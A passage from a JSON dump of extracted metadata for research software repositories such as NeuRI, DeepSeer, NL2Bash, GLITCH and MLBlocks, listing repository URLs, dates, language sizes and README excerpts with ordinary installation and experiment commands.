                    "value": "```bash\n# PyTorch\npython experiments/genstat.py --root $(pwd)/gen/torch-neuri-n5\npython experiments/genstat.py --root $(pwd)/gen/torch-neuri-i-n5\npython experiments/genstat.py --root $(pwd)/gen/torch-neuri-r-n5\npython experiments/genstat.py --root $(pwd)/gen/torch-symbolic-cinit-n5\n\n# TensorFlow\npython experiments/genstat.py --root $(pwd)/gen/tensorflow-neuri-n5\npython experiments/genstat.py --root $(pwd)/gen/tensorflow-neuri-i-n5\npython experiments/genstat.py --root $(pwd)/gen/tensorflow-neuri-r-n5\npython experiments/genstat.py --root $(pwd)/gen/tensorflow-symbolic-cinit-n5\n``` \n",
                    "original_header": "Table 1 &amp; 2"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\npython experiments/viz_merged_cov.py --folders                  \\\n        $(pwd)/gen/tensorflow-symbolic-cinit-n5.models/coverage \\\n        $(pwd)/gen/tensorflow-neuri-r-n5.models/coverage        \\\n        $(pwd)/gen/tensorflow-neuri-i-n5.models/coverage        \\\n        $(pwd)/gen/tensorflow-neuri-n5.models/coverage          \\\n    --tags '\\textsc{NNSmith}' '\\textsc{NeuRI}$^r$' '\\textsc{NeuRI}$^i$'  '\\textsc{NeuRI}'\n``` \n",
                    "original_header": "Figure 6 (a)"
                },
                "confidence": 0.9999996789626611,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\npython experiments/viz_merged_cov.py --folders             \\\n        $(pwd)/gen/torch-symbolic-cinit-n5.models/coverage \\\n        $(pwd)/gen/torch-neuri-r-n5.models/coverage        \\\n        $(pwd)/gen/torch-neuri-i-n5.models/coverage        \\\n        $(pwd)/gen/torch-neuri-n5.models/coverage          \\\n    --tags '\\textsc{NNSmith}' '\\textsc{NeuRI}$^r$' '\\textsc{NeuRI}$^i$'  '\\textsc{NeuRI}'\n``` \n",
                    "original_header": "Figure 6 (b)"
                },
                "confidence": 0.9999958162255193,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\npython experiments/viz_merged_cov.py --folders             \\\n        $(pwd)/gen/torch-neuri-n1.models/coverage          \\\n        $(pwd)/gen/torch-neuri-n5.models/coverage          \\\n        $(pwd)/gen/torch-neuri-n9.models/coverage          \\\n        $(pwd)/gen/torch-neuri-n13.models/coverage         \\\n    --tags '\\#Node 1' '\\#Node 5' '\\#Node 9' '\\#Node 13'\n``` \n",
                    "original_header": "Figure 6 (c)"
                },
                "confidence": 0.9999999840463546,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\nsource ./env_std.sh\npython3 neuri/autoinf/inference/tree.py\npython3 neuri/autoinf/inference/augmentation.py\npython3 neuri/autoinf/inference/shape_solve.py\npython3 neuri/autoinf/inference/predicate_solve.py\npython3 neuri/autoinf/inference/nnsmith_reuse.py\npython3 neuri/autoinf/inference/rule_validity.py\npython3 neuri/autoinf/inference/rosette_solve.py\n``` \n",
                    "original_header": "S1: Tree &amp; rule generation"
                },
                "confidence": 0.9998491395941018,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\nRULE_DIR=$(pwd)/gen ./fuzz.sh 1 neuri-i   torch      torchjit 4h\nRULE_DIR=$(pwd)/gen ./fuzz.sh 1 neuri-i   tensorflow xla      4h\n```\n \n",
                    "original_header": "S2: 1-Node test-cases generation"
                },
                "confidence": 0.9999364180170898,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\npython3 table3.py\npython3 table4.py\n``` \n",
                    "original_header": "Table 3 &amp; 4"
                },
                "confidence": 0.9897782751701648,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-29T22:29:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-12T07:44:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 624518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4540
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1264
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "306": {
        "filename": "momentum-lab-workspace_DeepSeer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ma-labo/DeepSeer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "*We suggest use virtual environment to avoid messing up your own environments.*\n\n~~~sh\n$ python -m venv ./venv\n$ source ./venv/bin/activate\n$ pip install -r ./server/deepstellar_backend/requirements.txt\n~~~\n",
                    "type": "Text_excerpt",
                    "original_header": "Python &gt;= 3.6",
                    "parent_header": [
                        "DeepSeer: Interactive RNN Explanation and Debugging via State Abstraction",
                        "Getting Started",
                        "Environments Set-up"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/momentum-lab-workspace/DeepSeer/main/README.md"
            },
            {
                "result": {
                    "value": "~~~sh\n$ cd ./web/dashboard\n$ npm install\n~~~\n",
                    "type": "Text_excerpt",
                    "original_header": "NPM &gt;= 7",
                    "parent_header": [
                        "DeepSeer: Interactive RNN Explanation and Debugging via State Abstraction",
                        "Getting Started",
                        "Environments Set-up"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/momentum-lab-workspace/DeepSeer/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-25T03:58:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-13T02:04:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 130483
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 81631
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 8796
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "RAML",
                    "name": "RAML",
                    "type": "Programming_language",
                    "size": 649
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 364
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "307": {
        "filename": "evidencebp_general_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evidencebp/general",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Supplementary Materials of the [\"Corrective commit probability: a measure of the effort invested in bug fixing\"](https://www.cs.huji.ac.il/~feit/papers/CCP21SQJ.pdf) paper by Idan Amit and [Dror G. Feitelson](https://www.cs.huji.ac.il/~feit/).\n\nPlease cite as\n``` \n@Article{Amit2021CCP,\nauthor={Amit, Idan\nand Feitelson, Dror G.},\ntitle={Corrective commit probability: a measure of the effort invested in bug fixing},\njournal={Software Quality Journal},\nyear={2021},\nmonth={Aug},\nday={05},\nabstract={The effort invested in software development should ideally be devoted to the implementation of new features. But some of the effort is invariably also invested in corrective maintenance, that is in fixing bugs. Not much is known about what fraction of software development work is devoted to bug fixing, and what factors affect this fraction. We suggest the Corrective Commit Probability (CCP), which measures the probability that a commit reflects corrective maintenance, as an estimate of the relative effort invested in fixing bugs. We identify corrective commits by applying a linguistic model to the commit messages, achieving an accuracy of 93{\\%}, higher than any previously reported model. We compute the CCP of all large active GitHub projects (7,557 projects with 200+ commits in 2019). This leads to the creation of an investment scale, suggesting that the bottom 10{\\%} of projects spend less than 6{\\%} of their total effort on bug fixing, while the top 10{\\%} of projects spend at least 39{\\%} of their effort on bug fixing --- more than 6 times more. Being a process metric, CCP is conditionally independent of source code metrics, enabling their evaluation and investigation. Analysis of project attributes shows that lower CCP (that is, lower relative investment in bug fixing) is associated with smaller files, lower coupling, use of languages like JavaScript and C{\\#} as opposed to PHP and C++, fewer code smells, lower project age, better perceived quality, fewer developers, lower developer churn, better onboarding, and better productivity.},\nissn={1573-1367},\ndoi={10.1007/s11219-021-09564-z},\nurl={https://doi.org/10.1007/s11219-021-09564-z},\npages={1--45},\npublisher={Springer}\n\n}\n\n```\n\nIt was later extended as part of\n",
                    "type": "Text_excerpt",
                    "original_header": "Corrective commit probability: a measure of the effort invested in bug fixing"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/evidencebp/general/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To collect the data, follow instructions in queries/main.sql \n",
                    "original_header": "Follow Your Nose - Which Code Smells are Worth Chasing?"
                },
                "confidence": 0.9530007217929776,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evidencebp/general/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Live version is updating at https://github.com/evidencebp/general/ \n",
                    "original_header": "Versions"
                },
                "confidence": 0.9988939408453767,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evidencebp/general/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-05T14:50:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-28T05:38:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "308": {
        "filename": "M3SOulu_next_event_prediction_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/M3SOulu/next_event_prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-21T13:00:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-06T09:06:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 23850
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "309": {
        "filename": "TellinaTool_nl2bash_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TellinaTool/nl2bash",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To reproduce our experiments, please install TensorFlow 2.0. The experiments can be reproduced on machines with or without GPUs. However, training with CPU only is extremely slow and we do not recommend it. Inference with CPU only is slow but tolerable.\n\nWe suggest following the [official instructions](https://www.tensorflow.org/install/) to install the library. The code has been tested on Ubuntu 16.04 + CUDA 10.0 + CUDNN 7.6.3.\n",
                    "type": "Text_excerpt",
                    "original_header": "Install TensorFlow",
                    "parent_header": [
                        "NL2Bash",
                        "Run Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/README.md"
            },
            {
                "result": {
                    "value": "Dev set evaluation\n```\n./bash-run.sh --data bash --prediction_file <path_to_your_model_output_file> --manual_eval\n```\n\nTest set evaluation\n```\n./bash-run.sh --data bash --prediction_file <path_to_your_model_output_file> --manual_eval --test\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Manual",
                    "parent_header": [
                        "NL2Bash",
                        "Run Experiments",
                        "Evaluate models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/README.md"
            },
            {
                "result": {
                    "value": "In our experiment, we conduct manual evaluation as the correctness of a Bash translation cannot simply be determined by mapping it to a set of ground truth.\nWe suggest the following practices for future work to generate comparable results and to accelerate the development cycle.\n1. If you plan to run your own manual evaluation, please annotate the output of both your system(s) and the baseline systems you compared to. This is to ensure that the newly proposed system(s) and the baselines are judged by the same group of annotators.\n2. If you run manual evaluation, please release [the examples annotated with their annotations](https://github.com/TellinaTool/nl2bash/tree/master/data/bash/manual_judgements). This helps others to replicate the results and reuse these annotations.\n3. During model development you could annotate a small subset of the dev examples (50-100 is likely enough) to estimate the true dev set accuracy. We released a script which saves any previous annotations and opens a commandline interface for judging any unseen predictions ([manual_eval.md](https://github.com/TellinaTool/nl2bash/blob/master/manual_eval.md)).\n\nThe motivation for the practices above is detailed in issue [#6](https://github.com/TellinaTool/nl2bash/issues/6).\n",
                    "type": "Text_excerpt",
                    "original_header": "Notes on Manual Evaluation",
                    "parent_header": [
                        "NL2Bash",
                        "Run Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u26a0\ufe0f If you plan to run manual evaluation yourself, please refer to [\"Notes on Manual Evaluation\"](#notes-on-manual-evaluation) for issues you should pay attention to.\n \n",
                    "original_header": "Manually Evaluated Translation Accuracy"
                },
                "confidence": 0.9947163875447913,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* **Apr 24, 2020** The dataset `data/bash` is separately licensed under the terms of the MIT license.\n* **Oct 20, 2019** release standard evaluation scripts\n* **Oct 20, 2019** update to Tensorflow 2.0\n \n",
                    "original_header": "Changelog"
                },
                "confidence": 0.9849250126265762,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-01-29T20:19:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T13:30:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "NewLisp",
                    "name": "NewLisp",
                    "type": "Programming_language",
                    "size": 1032340
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 753428
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 97121
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4309
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1975
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "310": {
        "filename": "STAR-RG_shipwright_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/STAR-RG/shipwright",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n\nCloning the git repository gives you our data and tools. We assume you have a working installation of Docker to use this artifact (see `REQUIREMENTS.md`).\n\nRun:\n\n```bash\ngit clone https://github.com/STAR-RG/shipwright\n\ncd ./shipwright\n```\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/STAR-RG/shipwright/main/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-12T19:21:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T02:32:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 6570490
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 81409
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 11041
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "311": {
        "filename": "sr-lab_GLITCH_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sr-lab/GLITCH",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install run:\n```\npython -m pip install -e .\n```\n\nTo use the tool for Chef you also need Ruby and its Ripper package installed.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "GLITCH"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sr-lab/GLITCH/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "GLITCH has a Visual Studio Code extension which is available [here](https://github.com/sr-lab/GLITCH/tree/main/vscode-extension/glitch).\n \n",
                    "original_header": "VSCode extension"
                },
                "confidence": 0.9809808659515912,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sr-lab/GLITCH/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-28T12:53:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-12T01:46:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 522234
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HCL",
                    "name": "HCL",
                    "type": "Programming_language",
                    "size": 163893
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Puppet",
                    "name": "Puppet",
                    "type": "Programming_language",
                    "size": 9324
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 6683
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 4859
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "312": {
        "filename": "wssun_SourceCodeSearch_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wssun/SourceCodeSearch",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n**NOTE: We intend to keep updating with the most recent papers whenever time permits, and we warmly welcome pull requests or issues regarding any missing papers. If you find any information is incorrect, please feel free to contact us. We will promptly confirm and make the necessary corrections. All researchers are encouraged to participate in enhancing this repository and expanding the knowledge within the field of source code search.** \n",
                    "original_header": "A Survey of Source Code Search: A 3-Dimensional Perspective"
                },
                "confidence": 0.9325111872260037,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wssun/SourceCodeSearch/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-11-06T11:59:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T13:54:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "313": {
        "filename": "Empirical-Study-on-AutoML_AutoML-paper_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Empirical-Study-on-AutoML/AutoML-paper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-04-08T02:23:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-16T10:25:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 87290
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "314": {
        "filename": "HDI-Project_MLBlocks_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MLBazaar/MLBlocks",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The easiest and recommended way to install **MLBlocks** is using [pip](\nhttps://pip.pypa.io/en/stable/):\n\n```bash\npip install mlblocks\n```\n\nThis will pull and install the latest stable release from [PyPi](https://pypi.org/).\n\nIf you want to install from source or contribute to the project please read the\n[Contributing Guide](https://mlbazaar.github.io/MLBlocks/contributing.html#get-started).\n",
                    "type": "Text_excerpt",
                    "original_header": "Install with `pip`",
                    "parent_header": [
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/MLBlocks/master/README.md"
            },
            {
                "result": {
                    "value": "In order to be usable, MLBlocks requires a compatible primitives library.\n\nThe official library, required in order to follow the following MLBlocks tutorial,\nis [MLPrimitives](https://github.com/MLBazaar/MLPrimitives), which you can install\nwith this command:\n\n```bash\npip install mlprimitives\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "MLPrimitives",
                    "parent_header": [
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/HDI-Project/MLBlocks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Documentation: https://mlbazaar.github.io/MLBlocks\n* Github: https://github.com/MLBazaar/MLBlocks\n* License: [MIT](https://github.com/MLBazaar/MLBlocks/blob/master/LICENSE)\n* Development Status: [Pre-Alpha](https://pypi.org/search/?c=Development+Status+%3A%3A+2+-+Pre-Alpha)\n \n",
                    "original_header": "MLBlocks"
                },
                "confidence": 0.9999995221029115,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HDI-Project/MLBlocks/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-06-08T15:36:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-08T08:25:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 155298
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 8013
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "315": {
        "filename": "apaleyes_causality-fbp_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/apaleyes/causality-fbp",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-29T11:51:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-20T16:59:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 7765912
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 372088
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 27523
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 285
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "316": {
        "filename": "S2-group_icra-ws-robotics-rosbag_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/S2-group/icra-ws-robotics-rosbag",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Note that it is not necessary for our architecture extractor, which is independent of platforms. However, it requires a few dependencies, solved by the following commands:\n\n```\n$ pip3 install -r ./requirements.txt\n$ sudo apt install graphviz\n```\nIf the requirements list is/becomes broken, do not hesitate to pull request the necessary updates.\n\nThen, just run the extraction script on a bag file: \n```\n$ ./extractor.sh <ros_version> [<start_time> <end_time>] /path/file\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Automatic Extraction of Time-windowed ROS Computation Graphs from ROS Bag Files"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/icra-ws-robotics-rosbag/icra-workshop/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-10T23:52:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-18T19:38:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18291
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 7540
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 6663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "317": {
        "filename": "mehdigolzadeh_BoDeGHa_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mehdigolzadeh/BoDeGHa",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install BoDeGHa, run the following command:\n```\npip install git+https://github.com/mehdigolzadeh/BoDeGHa\n```\nGiven that this tool has many dependencies, and in order not to conflict with already installed packages, it is recommended to use a virtual environment before its installation. You can install and create a _Python virtual environment_ and then install and run the tool in this environment. You can use any virtual environment of your choice. Below are the steps to install and create a virtual environment with **virtualenv**.\n\nUse the following command to install the virtual environment:\n```\npip install virtualenv\n```\nCreate a virtual environment in the folder where you want to place your files:\n```\nvirtualenv <name>\n```\nStart using the environment by:\n```\nsource <name>/bin/activate\n```\nAfter running this command your command line prompt will change to `(<name>) ...` and now you can install BoDeGHa with the pip command.\nWhen you are finished running the tool, you can quit the environment by:\n```\ndeactivate\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "BoDeGHa"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mehdigolzadeh/BoDeGHa/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-06-04T12:05:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
